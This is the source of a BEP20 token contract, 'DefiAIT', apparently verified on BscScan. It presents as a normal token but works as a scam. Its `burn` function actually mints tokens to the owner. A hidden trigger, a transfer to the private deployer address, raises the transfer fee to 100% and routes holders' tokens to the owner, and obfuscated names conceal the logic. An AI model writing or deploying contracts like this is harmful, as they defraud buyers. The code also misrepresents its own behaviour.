/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.2;
contract DefiAIT {
uint256 public  TEHNTO = 100000000000000000;
uint256 public  CFYaWU = 100000000000000000000000;
uint256 public  GtcLay = 1000000000000000000;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant xqzBwS = 9+1;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  XSdFwz = 100000000000000000000;
address public  LBgPMg = address(0);
address public  mbimku = address(0);
address public  GhLRCg = address(0);
uint256 public  aEwhQH = 10000000000000000000000000000;
address public  BhUaCW = address(0);
address private  Lwbvpl = address(0);
string public  symbol = "DefiAIT";
uint256 private  PUZPVk = 10000000000000;
uint256 public  LzmDFq = 10000000000000000000;
uint256 public  cVOxFr = 100000000000000000000000;
address public owner;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  HTjAZS = address(0);
address public  kpVXan = address(0);
string public  name = "DefiAIT";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  YZHNxh = 10000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AJIUIg");
require(to != address(0), "AJIUIg");
require(amount <= balanceOf[from], "AJIUIg");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* xqzBwS/PUZPVk ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==Lwbvpl){
PUZPVk = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
Lwbvpl = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}